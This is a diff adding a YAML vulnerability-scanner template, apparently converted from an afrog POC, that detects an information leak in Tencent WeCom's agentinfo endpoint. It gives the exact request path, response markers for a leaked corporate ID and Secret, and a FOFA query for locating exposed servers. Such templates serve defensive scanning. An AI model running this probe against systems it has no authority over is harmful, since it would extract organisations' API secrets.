@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"strcorpid":'
+          - '"Secret":'
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/cgi-bin/gateway/agentinfo'
+id: tencent-wechat-agentinfo-disclosure
+info:
+  author: peiqi
+  description: |
+    腾讯 企业微信 agentinfo 接口存在信息泄漏漏洞，攻击者通过漏洞可以获取企业微信 Secret
+    FOFA: body="wework_admin.normal_layout"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 腾讯 企业微信 agentinfo 信息泄漏漏洞
+  severity: high
+  tags: tencent,wechat,disclosure,argus-import
